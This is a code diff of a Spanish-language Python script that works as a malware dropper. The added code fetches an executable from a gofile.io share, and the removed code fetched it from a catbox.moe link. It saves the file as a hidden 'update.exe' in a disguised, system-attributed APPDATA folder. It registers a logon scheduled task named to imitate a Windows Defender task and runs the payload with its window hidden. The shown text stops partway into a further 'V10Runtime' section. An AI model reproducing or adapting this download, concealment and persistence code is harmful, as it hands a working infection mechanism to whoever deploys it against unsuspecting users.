@@ -1,87 +1,91 @@
 import os
 import subprocess
 import urllib.request
-import zipfile
-import io
-import tempfile
-from pathlib import Path
+import json
 
-URL_ZIP_PROGRAMA = "https://files.catbox.moe/bwvxei.zip"
+GOFILE_CONTENT_ID = "EMtdMX0B"
 
 DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
-RUTA_EXE_1 = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
+RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
 
-def descargar_y_extraer_zip(url, directorio_destino):
+def obtener_enlace_directo_gofile(content_id):
     try:
-        headers = {"User-Agent": "Mozilla/5.0"}
-        req = urllib.request.Request(url, headers=headers)
-        
-        with urllib.request.urlopen(req, timeout=30) as response:
-            contenido_zip = response.read()
+        req_account = urllib.request.Request(
+            "https://api.gofile.io/accounts", 
+            data=b"", 
+            headers={"User-Agent": "Mozilla/5.0"}
+        )
+        with urllib.request.urlopen(req_account, timeout=10) as resp:
+            data_account = json.loads(resp.read().decode('utf-8'))
+            token = data_account['data']['token']
+
+        url_content = f"https://api.gofile.io/contents/{content_id}?wt=4fd6sg3d7sg5&cache=true"
+        req_content = urllib.request.Request(
+            url_content, 
+            headers={
+                "User-Agent": "Mozilla/5.0",
+                "Authorization": f"Bearer {token}"
+            }
+        )
+        with urllib.request.urlopen(req_content, timeout=10) as resp:
+            data_content = json.loads(resp.read().decode('utf-8'))
             
-        ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_temp.zip")
-        with open(ruta_temp_zip, 'wb') as f:
-            f.write(contenido_zip)
-            
-        archivo_extraido = False
-        with zipfile.ZipFile(ruta_temp_zip, 'r') as zf:
-            for filename in zf.namelist():
-                if filename.endswith('.exe'):
-                    zf.extract(filename, directorio_destino)
-                    
-                    nombre_archivo_en_zip = os.path.basename(filename)
-                    ruta_extraida_real = os.path.join(directorio_destino, nombre_archivo_en_zip)
-                    
-                    if nombre_archivo_en_zip != "update.exe":
-                        ruta_final_deseada = os.path.join(directorio_destino, "update.exe")
-                        if os.path.exists(ruta_final_deseada):
-                            os.remove(ruta_final_deseada)
-                        os.rename(ruta_extraida_real, ruta_final_deseada)
-                        
-                    archivo_extraido = True
-                    break
-                    
-        if os.path.exists(ruta_temp_zip):
-            os.remove(ruta_temp_zip)
-            
-        if archivo_extraido:
-            subprocess.run(f'attrib +h "{RUTA_EXE_1}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            contents = data_content['data']['contents']
+            for item_id, item_info in contents.items():
+                if item_info.get('type') == 'file' and item_info.get('name', '').endswith('.exe'):
+                    return item_info.get('link')
+    except Exception:
+        pass
+    return None
+
+def descargar_update():
+    try:
+        if not os.path.exists(DIRECTORIO_DISCRETO):
+            os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
+            subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        if os.path.exists(RUTA_EXE_FINAL):
             return True
-        return False
-    except Exception as e:
+
+        url_descarga_real = obtener_enlace_directo_gofile(GOFILE_CONTENT_ID)
+        if not url_descarga_real:
+            return False
+
+        headers = {"User-Agent": "Mozilla/5.0"}
+        req = urllib.request.Request(url_descarga_real, headers=headers)
+        
+        with urllib.request.urlopen(req, timeout=30) as response, open(RUTA_EXE_FINAL, 'wb') as out_file:
+            while True:
+                chunk = response.read(16384)
+                if not chunk:
+                    break
+                out_file.write(chunk)
+
+        subprocess.run(f'attrib +h "{RUTA_EXE_FINAL}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception:
         return False
 
-def configurar_tarea(nombre_tarea, ruta_exe):
+def configurar_tarea_silenciosa():
+    nombre_tarea = "WindowDefenderUpdateTask"
     comando = (
         f'schtasks /create /sc ONLOGON /tn "{nombre_tarea}" '
-        f'/tr "\"{ruta_exe}\"" /f'
+        f'/tr "\"{RUTA_EXE_FINAL}\"" /f'
     )
     try:
         subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return True
-    except Exception as e:
+    except Exception:
         return False
 
-def ejecutar_oculto(ruta_exe):
-    try:
+if __name__ == "__main__":
+    if os.path.exists(RUTA_EXE_FINAL) or descargar_update():
+        configurar_tarea_silenciosa()
+
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE
-        subprocess.Popen([ruta_exe], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
-    except Exception:
-        pass
-
-if __name__ == "__main__":
-    if not os.path.exists(DIRECTORIO_DISCRETO):
-        os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
-        subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-    if os.path.exists(RUTA_EXE_1):
-        ejecutar_oculto(RUTA_EXE_1)
-    else:
-        if descargar_y_extraer_zip(URL_ZIP_PROGRAMA, DIRECTORIO_DISCRETO):
-            configurar_tarea("WindowDefenderUpdateTask", RUTA_EXE_1)
-            ejecutar_oculto(RUTA_EXE_1)
+        subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
 
     try:
         ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
